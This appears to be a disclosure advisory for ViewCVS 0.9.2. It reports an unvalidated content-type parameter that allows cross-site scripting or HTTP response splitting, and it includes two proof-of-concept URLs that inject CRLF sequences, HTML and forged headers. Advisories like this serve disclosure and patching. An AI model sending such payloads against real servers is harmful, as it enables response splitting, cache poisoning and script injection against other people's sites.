              Two Vulnerabilities in ViewCVS
---------------------------------------------------------------------------

Affected software description:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

ViewCVS 0.9.2 - ViewCVS is a browser interface for CVS and Subversion
version control repositories

ViewCVS can browse directories, change logs, and revisions of files. It
can display diffs between versions and show selections of files based on
tags or branches. In addition, ViewCVS has "annotation" / "blame"
support, and Bonsai-like query facility

Web : http://viewcvs.sourceforge.net

---------------------------------------------------------------------------

Vulnerabilities:
~~~~~~~~~~~~~~~~

A. Cross Site Scripting Vulnerability and/or HTTP Response Splitting

A1. When you want to view any source file that is stored in the CVS
repository you can 
select the mime-type to view this (in example, text/html or text/plain).
This is a 
parameter that receives thet viewcvs.py script and is not verified.

I'm not sure if this is an HTTP Response Splitting vulnerability and/or
a Cross Site Scripting,
but is a security problem.

To try the vulnerabilities you can try the following the Proof of
Concepts: 

	Sample 1 :
	~~~~~~~~~~


http://<site-with-viewcvs-092>/cgi-bin/viewcvs/project/source.file?rev=HEAD&content-type=text/html%0d%0a%0d%0a<html><body%20bgcolor="black"><font%20size=7%20color=red>XSS%20or%20HTTP%20Response%20Splitting</font></html>

	Sample 2 :
	~~~~~~~~~~


http://<site-with-viewcvs-092>/cgi-bin/viewcvs/*checkout*/project/source.file?rev=1.0&content-type=text/html%0d%0aContent-Length:1937%0d%0a%0d%0aHi


The fix:
~~~~~~~~

The vendor was contacted but no path for the 0.9.2 version has been
released. Anyway, the 
problems has been fixed in the ViewCVS 1.0-dev version available via
CVS.
